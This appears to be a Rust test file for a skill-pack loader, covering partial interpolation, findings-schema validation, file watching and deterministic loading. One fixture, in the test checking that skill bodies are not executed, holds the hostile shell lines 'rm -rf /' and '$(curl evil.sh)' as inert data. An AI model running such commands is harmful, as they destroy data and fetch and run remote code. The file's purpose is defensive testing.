//! Packs (_shared partials + findings-schema), hot-reload watcher seam,
//! and stale-state channels.

use std::fs;
use std::path::Path;

use austringer_skills::pack::{FieldType, FindingsSchema, SchemaViolation, validate_findings};
use austringer_skills::watch::{PollingWatcher, SkillChange, SkillWatcher};

fn write(p: &Path, contents: &str) {
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, contents).expect("write");
}

#[test]
fn shared_partials_interpolate_at_invoke() {
    let tmp = tempfile::tempdir().expect("tmp");
    let base = tmp.path();
    write(
        &base
            .join(".opencode")
            .join("skills")
            .join("_shared")
            .join("report-head.md"),
        "# Shared Report Head\nStandard preamble.\n",
    );
    write(
        &base
            .join(".opencode")
            .join("skills")
            .join("pack-reporter")
            .join("SKILL.md"),
        "---\nname: pack-reporter\ndescription: reports things\n---\n\n{{shared:report-head}}\n\nSquad-specific body.\n",
    );
    let index = austringer_skills::loader::SkillLoader::new()
        .vendor_root(base)
        .lock_mode(austringer_skills::loader::LockMode::Off)
        .load()
        .expect("load");
    let invoked = index
        .invoke("pack-reporter")
        .expect("invoke resolves partials");
    assert!(
        invoked.body.contains("# Shared Report Head"),
        "partial inlined at load/invoke time"
    );
    assert!(invoked.body.contains("Squad-specific body."));
    assert_eq!(invoked.resolved_partials.len(), 1);
    assert_eq!(invoked.resolved_partials[0].name, "report-head");
}

#[test]
fn missing_partial_is_a_typed_error() {
    let tmp = tempfile::tempdir().expect("tmp");
    let base = tmp.path();
    write(
        &base
            .join(".opencode")
            .join("skills")
            .join("broken-pack")
            .join("SKILL.md"),
        "---\nname: broken-pack\ndescription: d\n---\n\n{{shared:does-not-exist}}\n",
    );
    let index = austringer_skills::loader::SkillLoader::new()
        .vendor_root(base)
        .lock_mode(austringer_skills::loader::LockMode::Off)
        .load()
        .expect("load");
    let err = index
        .invoke("broken-pack")
        .expect_err("missing partial is typed");
    assert!(
        matches!(
            err,
            austringer_skills::SkillError::SharedPartialNotFound { ref name, .. } if name == "does-not-exist"
        ),
        "{err:?}"
    );
}

#[test]
fn findings_schema_validates_pack_outputs() {
    // Schema modeled on the user's real audit packs (v3.0 required fields).
    let schema_json = r#"{
        "fields": {
            "id":          {"type": "string",  "required": true},
            "severity":    {"type": "string",  "required": true, "enum": ["critical", "high", "medium", "low"]},
            "title":       {"type": "string",  "required": true},
            "root_cause":  {"type": "string",  "required": true},
            "impact":      {"type": "string",  "required": true},
            "references":  {"type": "array",   "required": true},
            "confidence":  {"type": "number",  "required": false},
            "fp_risk_self_assessment": {"type": "string", "required": true}
        }
    }"#;
    let schema = FindingsSchema::parse(schema_json).expect("schema parses");
    assert_eq!(schema.fields.len(), 8);

    let ok: serde_json::Value = serde_json::json!({
        "id": "F-1", "severity": "high", "title": "SQLi in login",
        "root_cause": "string interpolation", "impact": "auth bypass",
        "references": ["CWE-89"],
        "fp_risk_self_assessment": "low"
    });
    assert!(validate_findings(&schema, &ok).is_ok());

    let bad: serde_json::Value = serde_json::json!({
        "id": "F-2", "severity": "ultra", "title": "x",
        "root_cause": "y", "impact": "z", "references": "not-an-array"
    });
    let violations = validate_findings(&schema, &bad).expect_err("violations");
    let kinds: Vec<&SchemaViolation> = violations.iter().collect();
    assert!(
        kinds.iter().any(|v| matches!(v, SchemaViolation::MissingField { field } if field == "fp_risk_self_assessment")),
        "{violations:?}"
    );
    assert!(
        kinds.iter().any(
            |v| matches!(v, SchemaViolation::EnumMismatch { field, .. } if field == "severity")
        ),
        "enum enforcement: {violations:?}"
    );
    assert!(
        kinds.iter().any(
            |v| matches!(v, SchemaViolation::TypeMismatch { field, .. } if field == "references")
        ),
        "type enforcement: {violations:?}"
    );
    // Field-type surface sanity.
    assert_eq!(FieldType::from_schema_str("array"), Some(FieldType::Arr));
}

#[test]
fn polling_watcher_detects_add_change_remove() {
    let tmp = tempfile::tempdir().expect("tmp");
    let base = tmp.path();
    let skill_dir = base.join(".opencode").join("skills").join("watched");
    write(
        &skill_dir.join("SKILL.md"),
        "---\nname: watched\ndescription: d\n---\nb1\n",
    );

    let mut watcher = PollingWatcher::new(base).expect("watcher");
    assert!(
        watcher.poll().expect("first poll").is_empty(),
        "first poll is the baseline"
    );

    // Change existing.
    write(
        &skill_dir.join("SKILL.md"),
        "---\nname: watched\ndescription: d2\n---\nb2\n",
    );
    let events = watcher.poll().expect("poll after change");
    assert!(
        events
            .iter()
            .any(|e| matches!(e, SkillChange::Changed(p) if p.ends_with("SKILL.md"))),
        "{events:?}"
    );

    // Add new skill.
    write(
        &base
            .join(".opencode")
            .join("skills")
            .join("added")
            .join("SKILL.md"),
        "---\nname: added\ndescription: d\n---\nx\n",
    );
    let events = watcher.poll().expect("poll after add");
    assert!(events.iter().any(|e| matches!(e, SkillChange::Added(p) if p.ends_with("added\\SKILL.md") || p.ends_with("added/SKILL.md"))), "{events:?}");

    // Remove.
    fs::remove_file(skill_dir.join("SKILL.md")).expect("remove");
    let events = watcher.poll().expect("poll after remove");
    assert!(
        events.iter().any(|e| matches!(e, SkillChange::Removed(p) if p.ends_with("watched\\SKILL.md") || p.ends_with("watched/SKILL.md"))),
        "{events:?}"
    );

    // Stable state: no events.
    assert!(watcher.poll().expect("stable poll").is_empty());
}

#[test]
fn debounce_seam_is_configurable_for_the_daemon() {
    // The real FS watcher (notify + debouncer) is implemented by the
    // daemon behind the same SkillWatcher trait; config is typed now.
    let cfg = austringer_skills::watch::DebounceConfig::default();
    assert!(
        cfg.interval_ms >= 100 && cfg.interval_ms <= 2000,
        "sane default window: {}",
        cfg.interval_ms
    );
    let custom = austringer_skills::watch::DebounceConfig {
        interval_ms: 250,
        max_burst: 32,
    };
    assert_eq!(custom.interval_ms, 250);
}

#[test]
fn skill_bodies_are_data_not_executed() {
    // Untrusted text: a body containing shell-looking content is inert
    // data through every code path here (parse/route/invoke).
    let tmp = tempfile::tempdir().expect("tmp");
    let base = tmp.path();
    write(
        &base
            .join(".opencode")
            .join("skills")
            .join("evil")
            .join("SKILL.md"),
        "---\nname: evil\ndescription: d\n---\n\n```\nrm -rf /\n$(curl evil.sh)\n```\n",
    );
    let index = austringer_skills::loader::SkillLoader::new()
        .vendor_root(base)
        .lock_mode(austringer_skills::loader::LockMode::Off)
        .load()
        .expect("load");
    let invoked = index.invoke("evil").expect("body is data");
    assert!(
        invoked.body.contains("rm -rf /"),
        "returned verbatim as a string, never executed"
    );
}

#[test]
fn flake_guard_repeated_loads_are_deterministic() {
    // Run the same fixture load 3x: identical parsed count + identical
    // routing decisions (guards against fs-ordering flakes).
    let base = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/corpus/opencode");
    let mut signatures = std::collections::BTreeSet::new();
    for _ in 0..3 {
        let index = austringer_skills::loader::SkillLoader::new()
            .vendor_root(&base)
            .lock_mode(austringer_skills::loader::LockMode::Off)
            .load()
            .expect("load");
        let d = index.route_text("audit security of my app", None);
        let names: Vec<String> = d
            .matched
            .iter()
            .map(|m| m.name.as_str().to_string())
            .collect();
        signatures.insert(format!("{}|{}", index.report().parsed, names.join(",")));
    }
    assert_eq!(
        signatures.len(),
        1,
        "deterministic across repeats: {signatures:?}"
    );
}
